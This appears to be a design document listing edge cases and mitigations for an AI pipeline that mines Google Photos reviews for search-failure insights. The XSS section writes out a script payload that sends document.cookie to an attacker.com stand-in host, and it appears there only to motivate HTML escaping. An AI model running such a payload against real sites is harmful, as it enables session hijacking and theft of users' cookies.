# Edge Cases, Failure Modes & Corner Scenarios Matrix
## AI-Powered Photo Retrieval Discovery Engine — Google Photos Use Case (`edge-case.md`)

---

## 1. Executive Overview & Scope

In building a discovery engine that processes unstructured, real-world human conversations from app store reviews, Reddit, and support forums, edge cases are not anomalies—they represent the normal messiness of user sentiment and personal episodic memory.

This document identifies all corner scenarios, failure modes, data anomalies, linguistic complexities, and infrastructure limits across the end-to-end pipeline, accompanied by deterministic mitigation protocols.

---

## 2. Comprehensive Edge Cases & Failure Modes Matrix

```
┌───────────────────────────────┬───────────────────────────────────┬─────────────────────────────────┐
│ System Layer                  │ Primary Risk / Edge Case          │ Deterministic Mitigation        │
├───────────────────────────────┼───────────────────────────────────┼─────────────────────────────────┤
│ Stage 1: Ingestion & Scraping │ Rate limits, CAPTCHAs, bot blocks │ Exponential backoff, proxy pool │
│ Stage 1: Content Ingestion    │ 0-char reviews, pure emoji posts  │ Pre-ingestion validation gate   │
│ Stage 2: Relevance Filter     │ "Search" used in non-photo sense  │ Dual-layer semantic intent gate │
│ Stage 2: Intent Boundary      │ Accidental deletion vs. Amnesia   │ Episodic memory cue check       │
│ Stage 3: Cognitive Extraction │ Sarcasm & hyperbolic complaints   │ Contextual intent prompting     │
│ Stage 3: Memory Ambiguity     │ Zero memory cues ("Nothing works")│ Flagged as "UNSPECIFIED_AMNESIA"│
│ Stage 3: Privacy / PII        │ Explicit PII in review text       │ Automated regex/NER scrubber    │
│ Infrastructure: Cloud LLM     │ Gemini Free Tier 429 Quota Wall   │ Seamless circuit-breaker failover│
│ Infrastructure: Local LLM     │ Ollama outputting markdown wrap   │ Strict regex JSON extractor     │
│ Stage 4: Semantic Clustering  │ HDBSCAN noise points (Label -1)   │ Unclustered anomaly reservoir   │
│ Stage 4: Cluster Distribution │ Giant super-cluster dominating all│ Two-pass hierarchical split     │
│ Stage 5: Opportunity Scoring  │ Low-sample bias (N=1, 100% fail)  │ Bayesian smoothed failure rate  │
│ Stage 6: Traceability Layer   │ Orphaned insights / broken links  │ Foreign key constraint & test   │
│ Stage 8: Dashboard / UI       │ XSS in verbatim reviews           │ Strict HTML entity escaping     │
└───────────────────────────────┴───────────────────────────────────┴─────────────────────────────────┘
```

---

## 3. Detailed Stage-by-Stage Corner Scenarios

### 3.1 Stage 1: Data Ingestion & Multi-Source Scraping

#### Edge Case 1.1: Platform Anti-Bot Blocks & IP Throttling
* **Scenario:** Scrapers targeting Play Store or Reddit receive HTTP 429, Cloudflare challenge pages, or connection resets during bulk ingestion.
* **Impact:** Incomplete dataset or pipeline halts prematurely.
* **Mitigation Protocol:**
  * Jittered pagination requests with randomized delays ($1.5\text{s} - 4.5\text{s}$).
  * Automatic checkpointing: ingestion progress is saved after every batch of 25 records into SQLite `ingestion_checkpoints` so runs can resume without duplicates.
  * Local static fixture fallback: if offline or blocked, fallback to pre-collected historical datasets in `data/raw_fixtures/`.

#### Edge Case 1.2: Empty Content, Pure Emojis, and Character Floods
* **Scenario:** User submits a 1-star review containing only: `"😡😡😡"`, `"worst"`, or a 20,000-character copy-pasted rant.
* **Impact:** Wasted LLM inference tokens or prompt overflow errors.
* **Mitigation Protocol:**
  * Strict length gate: $\text{length}(\text{clean\_text}) \ge 20 \text{ chars}$ and $\le 3,000 \text{ chars}$.
  * Emoji-to-text density check: If emojis exceed $50\%$ of string length, discard before normalization.

#### Edge Case 1.3: Multilingual & Code-Switching Reviews (Hinglish, Spanglish)
* **Scenario:** User mixes English with vernacular: *"Bhai photo search bilkul kaam nahi kar raha, last year Goa beach ka photo gayab ho gaya."*
* **Impact:** Keyword filters calibrated exclusively for English miss critical retrieval friction signals.
* **Mitigation Protocol:**
  * Local Ollama text normalizer runs an explicit multilingual normalization prompt to translate/transliterate core intent to standardized English representation while preserving the raw verbatim for audit trails.

---

### 3.2 Stage 2: Data Cleaning & Relevance Filtering

#### Edge Case 2.1: Semantic Keyword Polysemy ("Search" in Non-Photo Context)
* **Scenario:** User reviews state:
  * *"I had to search Google for 2 hours to find customer care."*
  * *"I am searching for another gallery app to replace this garbage."*
* **Impact:** Traditional keyword matching flags these as retrieval friction, creating false positives.
* **Mitigation Protocol:**
  * Two-phase gate: Regex keyword match flags candidate $\rightarrow$ Local Ollama zero-shot classifier confirms: *"Does this text describe a user attempting to locate a photograph in their personal media library?"*

#### Edge Case 2.2: The "Lost Photo" Conflation: Deletion/Sync Bug vs. Memory Amnesia
* **Scenario:** A user cries *"I lost all my photos from 2022!"*
  * Cause A: Google Photos sync bug or accidental deletion (Infrastructure / Bug issue).
  * Cause B: User cannot remember date/place and cannot locate it in an 80,000-photo library (Cognitive retrieval failure).
* **Impact:** Conflating cloud storage bugs with search retrieval problems distorts the product discovery signal.
* **Mitigation Protocol:**
  * Classifier specifically checks for memory markers: *Did the user attempt a search query, scroll, or recall specific traits?*
  * If the text mentions *"after update my gallery was emptied"* without retrieval actions, classify as `CLOUD_SYNC_BUG` and route away from the retrieval opportunity matrix.

#### Edge Case 2.3: Multi-Complaint "Kitchen Sink" Reviews
* **Scenario:** A 400-word review complains about 100GB Google One pricing, battery drain, UI icon redesigns, and concludes: *"and search doesn't even find my vaccination card"*.
* **Impact:** The retrieval complaint gets buried or filtered out due to billing terms.
* **Mitigation Protocol:**
  * Ollama sentence segmentation parses multi-sentence reviews into discrete thought clauses before classification.

---

### 3.3 Stage 3: Cognitive Memory & Signal Extraction

#### Edge Case 3.1: Sarcasm, Irony, and Hyperbolic Complaints
* **Scenario:** *"Brilliant search! Found 5,000 random white cars from the internet, but can't find my own car that I took a photo of yesterday."*
* **Impact:** Naive sentiment models might score "Brilliant search" positively or miss the core retrieval failure.
* **Mitigation Protocol:**
  * Cognitive extraction prompts focus on **Action $\rightarrow$ Expectation $\rightarrow$ Result**, completely bypassing positive/negative sentiment adjectives.
  * System identifies: Action: `query="my car"`, Result: `IRRELEVANT_FLOOD`, Outcome: `FAILED_IRRELEVANT`.

#### Edge Case 3.2: Hyper-Vague Memory with Zero Sensory Cues
* **Scenario:** *"Search is completely broken. Can never find what I want."*
* **Impact:** User provides zero clues about what they remembered or forgot.
* **Mitigation Protocol:**
  * Extractor marks `entities_remembered=[]`, `spatial_cues=None`, `temporal_cues=None`.
  * Flags problem category as `UNSPECIFIED_SEARCH_FRUSTRATION`.
  * Weighted out of high-order relational discovery cards to avoid diluting actionable feature concepts.

#### Edge Case 3.3: Stripped Metadata Trap (WhatsApp, Telegram, Downloaded Images)
* **Scenario:** *"I know I took this photo in 2018, but Photos placed it in March 2024 because I downloaded it from WhatsApp."*
* **Impact:** User blames search, but root cause is EXIF timestamp erasure during cross-platform messaging.
* **Mitigation Protocol:**
  * System captures `Metadata Dependency Trap` as a specific cognitive failure archetype where external application behavior destroys the system's temporal indexing foundation.

#### Edge Case 3.4: PII, Medical, and Sensitive Data Exposure
* **Scenario:** User writes: *"Can't find my passport photo John Doe DOB 12/04/1985 SSN 123-45-6789 taken at Boston clinic."*
* **Impact:** PII leakage into dashboard, databases, and LLM prompt context.
* **Mitigation Protocol:**
  * Pre-extraction sanitization: Regex masks SSNs, passport numbers, email addresses, and phone numbers (`[REDACTED_PII]`).
  * Ingestion pseudonymizes author usernames into anonymous hashes (`usr_7f8a91`).

---

### 3.4 Infrastructure & LLM Orchestration Edge Cases

#### Edge Case 4.1: Gemini Free Tier 429 Rate Limit Wall (15 RPM / 1,500 RPD)
* **Scenario:** Scraping yields 300 qualified records. Pipeline fires requests concurrently, instantly triggering HTTP 429 (`RESOURCE_EXHAUSTED`).
* **Impact:** Pipeline crashes, incomplete extraction, unhandled exceptions.
* **Mitigation Protocol:**
  * **Token Bucket Throttler:** Client enforces a hard ceiling of 14 RPM with $\Delta t = 4.3\text{s}$ spacing between calls.
  * **Circuit Breaker Failover:** If Gemini returns HTTP 429 despite throttling (or quota exhausted for the day), the request transparently re-routes to local Ollama (`llama3.2:3b` in JSON schema mode).
  * **Disk Cache (`llm_cache`):** SQLite table stores hash of `(model, prompt, input_text)`. Any repeated or restarted run re-uses existing extractions at 0 latency and 0 API quota cost.

#### Edge Case 4.2: Ollama Local Model Hallucinations & Non-JSON Formatting
* **Scenario:** When falling back to local Ollama, the model outputs conversational preambles: *"Sure! Here is the requested JSON format: ```json { ... } ``` Hope this helps!"*
* **Impact:** `json.loads()` crashes with `JSONDecodeError`.
* **Mitigation Protocol:**
  * Strict regex extractor: `re.search(r'\{.*\}', response, re.DOTALL)` extracts solely the valid JSON block.
  * Schema repair fallback: If JSON parsing still fails, run a local deterministic schema repair function with default fallback values rather than crashing the batch.

#### Edge Case 4.3: Ollama Server Offline or OOM Crash
* **Scenario:** Ollama process (`localhost:11434`) terminates due to system memory exhaustion or is not started by the user.
* **Impact:** Fallback fails, halting execution.
* **Mitigation Protocol:**
  * Pipeline runs an initial pre-flight check (`GET http://localhost:11434/api/tags`).
  * If Ollama is unreachable, logs a clear warning: *"Ollama offline. Running in Gemini-only throttled mode with SQLite cache."*

---

### 3.5 Stage 4 & 5: Semantic Clustering & Opportunity Scoring

#### Edge Case 5.1: HDBSCAN Noise Anomaly Reservoir (Cluster Label -1)
* **Scenario:** HDBSCAN assigns label `-1` to 25% of memory signal vectors that do not belong to dense clusters.
* **Impact:** If treated as a normal cluster, the engine generates a nonsense cluster named "Miscellaneous Chaos".
* **Mitigation Protocol:**
  * Cluster `-1` is explicitly isolated into the `unclustered_noise_reservoir`.
  * Noise points are excluded from the main Opportunity Matrix but remain searchable in the Evidence Explorer under an "Uncategorized Signals" filter.

#### Edge Case 5.2: The "Giant Blob" Super-Cluster Problem
* **Scenario:** 60% of complaints cluster around generic descriptions like *"Cannot find my picture"*, creating one massive super-cluster that obscures nuanced friction points like *"Screenshot utility amnesia"*.
* **Impact:** Unactionable discovery output (tells the PM nothing beyond "search fails").
* **Mitigation Protocol:**
  * **Two-Pass Hierarchical Clustering:** If any single cluster contains $>30\%$ of total vectors, run a secondary sub-clustering pass on that cluster with adjusted UMAP minimum distance parameters.

#### Edge Case 5.3: Low-Sample Distortion in Opportunity Scoring
* **Scenario:** A cluster has only $1$ conversation, but the user had severity $= 5/5$ and failure rate $= 100\%$. A naive formula ranks it higher than a cluster with $250$ conversations and $65\%$ failure rate.
* **Impact:** Product roadmaps misled by isolated, non-representative edge cases.
* **Mitigation Protocol:**
  * **Bayesian Smoothed Failure Rate:**
    $$R_{\text{smoothed}} = \frac{N_{\text{failed}} + (C \times R_{\text{prior}})}{N_{\text{total}} + C}$$
    where $C = 10$ (confidence pseudo-count) and $R_{\text{prior}} = 0.5$.
  * Volume threshold: Clusters with fewer than $5$ unique supporting users are automatically capped at the `LOW / BACKLOG` priority tier regardless of severity.

---

### 3.6 Stage 6 & 8: Traceability & Evidence Integrity

#### Edge Case 6.1: Orphaned Insights & Dangling Pointers
* **Scenario:** User updates database or deletes a raw conversation, leaving product insight cards referencing non-existent primary records.
* **Impact:** Breaches the fundamental "100% Evidence Traceable" promise of the engine.
* **Mitigation Protocol:**
  * SQLite `PRAGMA foreign_keys = ON` with `ON DELETE CASCADE`.
  * Pre-render verification test: Asserts that every `insight_id` maps to $\ge 5$ verified `raw_conversations` IDs before exporting the Product Discovery Report.

#### Edge Case 6.2: Stale Cluster Centroids after New Batch Ingestion
* **Scenario:** 500 new reviews are added, but clustering is not re-computed, causing new signals to have no cluster assignment.
* **Impact:** Discrepancy between global review counts and cluster sums.
* **Mitigation Protocol:**
  * Pipeline maintains an `is_dirty` flag in `system_state`. When new raw data is committed, the dashboard displays a badge: *"New evidence available. Re-index recommended."*

---

### 3.7 Stage 9 & 10: Interactive Dashboard & UI Edge Cases

#### Edge Case 7.1: Stored XSS Attacks in User Verbatim Quotes
* **Scenario:** Malicious user posts a review containing: `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`
* **Impact:** When a PM opens the Evidence Explorer drawer, the script executes in their browser session.
* **Mitigation Protocol:**
  * Strict DOM sanitization: All verbatim quotes are injected using `textContent` or escaped via HTML entity encodings (`&lt;script&gt;`).

#### Edge Case 7.2: Text Overflow & Extreme Review Lengths in Modal Cards
* **Scenario:** A user pasted an entire diagnostic crash log or a 2,500-word essay into their review.
* **Impact:** Destroys dashboard grid layouts, overflows modal viewports.
* **Mitigation Protocol:**
  * Verbatim snippet truncated to 280 characters in table views with a smooth *"Read Full Verbatim"* expanding drawer.
  * Fixed maximum height on modal body with customized CSS scrolling (`max-height: 60vh; overflow-y: auto;`).

#### Edge Case 7.3: Zero-Result Filter Intersections
* **Scenario:** PM sets filters: `Platform = iOS` AND `Tier = Critical` AND `Outcome = Instant Success`. No records match.
* **Impact:** Empty white screen or broken UI charts.
* **Mitigation Protocol:**
  * Explicit Empty State component: Renders a sleek graphic with *"No evidence matches this specific filter combination. Reset filters."* button.

---

## 4. Automated Edge-Case Verification Checklist

| Test ID | Edge Case Tested | Verification Method | Pass Criteria |
| :--- | :--- | :--- | :--- |
| `TC-EC-01` | Pure emoji / 0-char review | Pass `"😡😡😡"` to cleaner | Discarded; does not enter SQLite |
| `TC-EC-02` | Sarcastic complaint | Pass *"Brilliant search, finds everything except my photo"* | Classified as `FAILED_IRRELEVANT` |
| `TC-EC-03` | PII sanitization | Pass review with SSN & email address | Output contains `[REDACTED_PII]` |
| `TC-EC-04` | Gemini 429 quota failover | Force mock HTTP 429 response | Request seamlessly handled by Ollama |
| `TC-EC-05` | Ollama markdown wrap | Feed ```json { "test": true } ``` to parser | Cleanly parsed without `JSONDecodeError` |
| `TC-EC-06` | Low-sample opportunity bias | Compute score for $N=1, \text{fail}=1.0$ vs $N=100, \text{fail}=0.7$ | $N=100$ cluster ranks higher |
| `TC-EC-07` | Stored XSS in evidence | Inject `<script>alert(1)</script>` into quote | Rendered safely as plain text |
| `TC-EC-08` | Sub-50ms evidence lookup | Query evidence for cluster with 500 rows | API response latency $< 50\text{ ms}$ |
